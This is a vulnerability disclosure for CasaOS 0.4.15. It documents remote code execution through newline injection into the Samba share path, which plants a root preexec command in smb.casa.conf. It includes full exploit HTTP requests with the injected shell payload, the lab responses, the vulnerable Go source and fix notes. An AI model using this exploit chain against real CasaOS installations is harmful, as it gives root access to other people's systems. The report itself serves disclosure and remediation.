### Vulnerability details

**Official website / Product:** https://casaos.io / https://github.com/IceWhaleTech/CasaOS

**Repository:** IceWhaleTech/CasaOS (stars at selection: 37494)

**Vulnerability type:** RCE (Samba share Path newline injection → smb.casa.conf `root preexec`)

**Vulnerability versions:** 0.4.15 (Docker-verified on `nasselle/casa-img:latest`; source commit `0d3b2f444ec0193193cf03eef6d43c6e35b0183e`); `UpdateConfigFile` still concatenates unsanitized `share.Path`

**Vulnerability URL / Parameter:** `POST /v1/samba/shares` — JSON array element field `path` (create the newline-bearing directory first via `POST /v1/folder`)

**Complex:** yes

### Verification procedure

1. Bring up the lab stack (image `nasselle/casa-img:latest`, host **20305→8080**, version endpoint returns `0.4.15`; audited commit `IceWhaleTech/CasaOS` `0d3b2f444ec0193193cf03eef6d43c6e35b0183e`). Credentials: `admin` / `Admin123!`. Minimal reconstructable bring-up:

```bash
docker network create --subnet=10.203.5.0/24 casaos-r23a5-net
docker run -d --name casaos-r23a5 --network casaos-r23a5-net \
  -p 20305:8080 nasselle/casa-img:latest
# If casaos-main runs unprivileged: make /etc/samba writable, e.g.
# docker exec -u root casaos-r23a5 chmod 777 /etc/samba
```

2. `POST /v1/users/login` with body `{"username":"admin","password":"Admin123!"}`; take `access_token` from the response and put it in the raw `Authorization` header (**no** `Bearer` prefix). The JWT in the PoC packets below is the lab-captured value; replace it with a freshly issued token when reproducing.
3. `POST /v1/folder` with a `path` that exists on disk, embeds `root preexec`, and keeps `filepath.Base` clean by appending `\npath = /DATA/pocshare`. Full packet under “Prep: create newline path” below.
4. `POST /v1/samba/shares` with the same `path` (full exploit packet below).
5. CasaOS writes the injected `/etc/samba/smb.casa.conf`; production follows `CreateShare` → `UpdateConfigFile` → `RestartSMBD` to reload smbd.
6. Any guest SMB client accessing `//<host>/pocshare` runs `root preexec`, producing `/tmp/casaos_r23a5_pwned` (`uid=0(root)`) and `/DATA/rce_marker` (`RCE_OK`).

**Lab vs production notes:**

- `nasselle/casa-img` runs `casaos-main` as `ubuntu`; `/etc/samba` must be writable for the HTTP write of `smb.casa.conf` to succeed (production CasaOS typically runs privileged and needs no such tweak).
- The image may lack `/usr/share/casaos/shell/helper.sh` (`RestartSMBD`); after a successful HTTP injection, if smbd did not reload, start/reload smbd with the generated `/etc/samba/smb.casa.conf` to finish the execution chain (e.g. `smbd -s /etc/samba/smb.conf` or the distro equivalent). Production `CreateShare` calls `RestartSMBD` after writing the conf.
- The lab network used `casaos-r23a5-net` / `10.203.5.0/24`; the `smbclient` example host `10.203.5.2` below is the container address — substitute the actual container IP.

### Complete vulnerability PoC

#### Prep: create newline-bearing directory (`POST /v1/folder`, Docker-verified)

```http
POST /v1/folder HTTP/1.1
Host: 127.0.0.1:20305
Authorization: eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjEsImlzcyI6ImNhc2FvcyIsImV4cCI6MTc5MzU3ODAzNCwibmJmIjoxNzkzNTY3MjM0LCJpYXQiOjE3OTM1NjcyMzR9.rWMMhki7hKoJHgNHDHxF6cdpb9KMbuimpjgN67Eil9dewr1tZK_TmsftbEGcFLP-9h-WIY-Gnjaw7mxlDitalQ
Content-Type: application/json
Content-Length: 135
Connection: close

{"path": "/DATA/pocshare\n  root preexec = bash -c \"id>/tmp/casaos_r23a5_pwned;echo RCE_OK>/DATA/rce_marker\"\npath = /DATA/pocshare"}
```

Response:

```http
HTTP/1.1 200 OK
Content-Length: 43
Content-Type: application/json
Date: Sun, 01 Nov 2026 21:09:44 GMT
Vary: Accept-Encoding
Connection: close

{"success":200,"message":"ok","data":null}
```

#### Trigger: create Samba share (`POST /v1/samba/shares`, Docker-verified)

Complete HTTP request:

```http
POST /v1/samba/shares HTTP/1.1
Host: 127.0.0.1:20305
Authorization: eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjEsImlzcyI6ImNhc2FvcyIsImV4cCI6MTc5MzU3ODAzNCwibmJmIjoxNzkzNTY3MjM0LCJpYXQiOjE3OTM1NjcyMzR9.rWMMhki7hKoJHgNHDHxF6cdpb9KMbuimpjgN67Eil9dewr1tZK_TmsftbEGcFLP-9h-WIY-Gnjaw7mxlDitalQ
Content-Type: application/json
Content-Length: 156
Connection: close

[{"path": "/DATA/pocshare\n  root preexec = bash -c \"id>/tmp/casaos_r23a5_pwned;echo RCE_OK>/DATA/rce_marker\"\npath = /DATA/pocshare", "anonymous": true}]
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Content-Length: 209
Content-Type: application/json
Date: Sun, 01 Nov 2026 21:09:44 GMT
Vary: Accept-Encoding
Connection: close

{"success":200,"message":"ok","data":[{"id":0,"anonymous":true,"path":"/DATA/pocshare\n  root preexec = bash -c \"id\u003e/tmp/casaos_r23a5_pwned;echo RCE_OK\u003e/DATA/rce_marker\"\npath = /DATA/pocshare"}]}
```

Verification result notes:

- Response `success:200`; share created; echoed `path` retains `\n` and `root preexec`.
- Container `/etc/samba/smb.casa.conf` after the HTTP PoC:

```
[pocshare]
comment = CasaOS share pocshare
public = Yes
path = /DATA/pocshare
  root preexec = bash -c "id>/tmp/casaos_r23a5_pwned;echo RCE_OK>/DATA/rce_marker"
path = /DATA/pocshare
browseable = Yes
read only = No
guest ok = Yes
create mask = 0777
directory mask = 0777
force user = root
```

- `testparm -s` loads the standalone line:

```
	root preexec = bash -c "id>/tmp/casaos_r23a5_pwned;echo RCE_OK>/DATA/rce_marker"
```

- After `smbclient -N //10.203.5.2/pocshare -c ls`, expected container output:

```
uid=0(root) gid=0(root) groups=0(root)
RCE_OK
```

(i.e. `cat /tmp/casaos_r23a5_pwned` and `cat /DATA/rce_marker`.)

### Vulnerability analysis

When CasaOS materializes Samba shares, `path` is written into smb.conf without stripping newlines or Samba metacharacters. An authenticated admin can choose a path string that:

1. Keeps `filepath.Base(path)` a valid section name (append `\npath = /DATA/<clean>` so Base is the final segment);
2. Splits the `path = ` assignment across lines into a real path, an injected `root preexec`, and a second valid path.

The generated share already sets `force user = root` and `guest ok = Yes`, so guest SMB access executes `root preexec` as root. `POST /v1/folder` accepts newline paths, so the full chain is HTTP-only.

This is outside the product’s designed web-terminal / Compose execution surfaces; it is unexpected RCE through the share config writer.

### Trigger / sink source (full path and line numbers)

Route bind and existence check (path stored as-is; `CreateShare` then calls `UpdateConfigFile`):

```go
# File: route/v1/samba.go (CasaOS source)
# Lines: 69-96
func PostSambaSharesCreate(ctx echo.Context) error {
	shares := []model.Shares{}
	ctx.Bind(&shares)
	for _, v := range shares {
		if v.Path == "" {
			return ctx.JSON(common_err.CLIENT_ERROR, model.Result{Success: common_err.INSUFFICIENT_PERMISSIONS, Message: common_err.GetMsg(common_err.INSUFFICIENT_PERMISSIONS)})
		}
		if !file.Exists(v.Path) {
			return ctx.JSON(common_err.SERVICE_ERROR, model.Result{Success: common_err.DIR_NOT_EXISTS, Message: common_err.GetMsg(common_err.DIR_NOT_EXISTS)})
		}
		if len(service.MyService.Shares().GetSharesByPath(v.Path)) > 0 {
			return ctx.JSON(common_err.CLIENT_ERROR, model.Result{Success: common_err.SHARE_ALREADY_EXISTS, Message: common_err.GetMsg(common_err.SHARE_ALREADY_EXISTS)})
		}
		if len(service.MyService.Shares().GetSharesByPath(filepath.Base(v.Path))) > 0 {
			return ctx.JSON(common_err.CLIENT_ERROR, model.Result{Success: common_err.SHARE_NAME_ALREADY_EXISTS, Message: common_err.GetMsg(common_err.SHARE_NAME_ALREADY_EXISTS)})
		}
	}
	for _, v := range shares {
		shareDBModel := model2.SharesDBModel{}
		shareDBModel.Anonymous = true
		shareDBModel.Path = v.Path
		shareDBModel.Name = filepath.Base(v.Path)
		os.Chmod(v.Path, 0o777)
		service.MyService.Shares().CreateShare(shareDBModel)
	}

	return ctx.JSON(common_err.SUCCESS, model.Result{Success: common_err.SUCCESS, Message: common_err.GetMsg(common_err.SUCCESS), Data: shares})
}
```

Config concatenation and SMB restart (injection sink):

```go
# File: service/shares.go (CasaOS source)
# Lines: 72-97
func (s *sharesStruct) UpdateConfigFile() {
	shares := []model2.SharesDBModel{}
	s.db.Select("anonymous,path").Find(&shares)
	// generated config file
	configStr := ""
	for _, share := range shares {
		dirName := filepath.Base(share.Path)
		configStr += `
[` + dirName + `]
comment = CasaOS share ` + dirName + `
public = Yes
path = ` + share.Path + `
browseable = Yes
read only = No
guest ok = Yes
create mask = 0777
directory mask = 0777
force user = root

`
	}
	// write config file
	file.WriteToPath([]byte(configStr), "/etc/samba", "smb.casa.conf")
	// restart samba
	command.OnlyExec("source " + config.AppInfo.ShellPath + "/helper.sh ;RestartSMBD")
}
```

### Fix notes

1. Reject `\n`/`\r`/`\0` and Samba metacharacters in `path`; require a cleaned absolute path under an allowlisted root.
2. Escape or quote smb.conf values via a proper emitter; avoid raw string concatenation.
3. Use an allowlisted share identifier for section names instead of `filepath.Base(userPath)`.
4. Run `testparm` before reload; roll back on failure.
